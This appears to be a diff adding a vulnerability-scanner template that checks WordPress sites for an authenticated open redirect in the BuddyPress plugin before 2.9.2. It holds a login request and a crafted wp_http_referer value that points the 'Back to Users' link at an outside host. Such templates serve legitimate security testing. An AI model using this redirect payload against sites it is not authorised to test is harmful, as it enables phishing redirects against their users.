@@ -1,0 +1,52 @@
+id: wp-buddypress-open-redirect
+
+info:
+  name: WordPress BuddyPress < 2.9.2 - Authenticated Open Redirect
+  author: 0x_Akoko
+  severity: low
+  description: |
+    WordPress BuddyPress plugin before 2.9.2 contains an authenticated open redirect vulnerability via the wp_http_referer parameter on the bp-profile-edit admin page. After updating profile, the Back to Users link redirects to the attacker-specified URL.
+  reference:
+    - https://hackerone.com/reports/277502
+    - https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:L/A:N
+    cvss-score: 2.4
+    cwe-id: CWE-601
+  metadata:
+    verified: true
+    max-request: 2
+  tags: wordpress,wp-plugin,vuln,buddypress,redirect,authenticated
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - contains(header, "wordpress_logged_in")
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro&updated=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(content_type, "text/html")
+          - contains_all(body, "href=\"https://oast.pro\"", "Back to Users")
+        condition: and
+# digest: 490a00463044022074e10658c01f3df0cb36b2ccdf6fb8e7bc6807e87a95b925911d41dde4c64c8602202ee08c53beecb595f0e95bcb600bdf3b4cf04a57d55629f9ce97914bf696d93e:922c64590222798bb761d5b6d8e72950
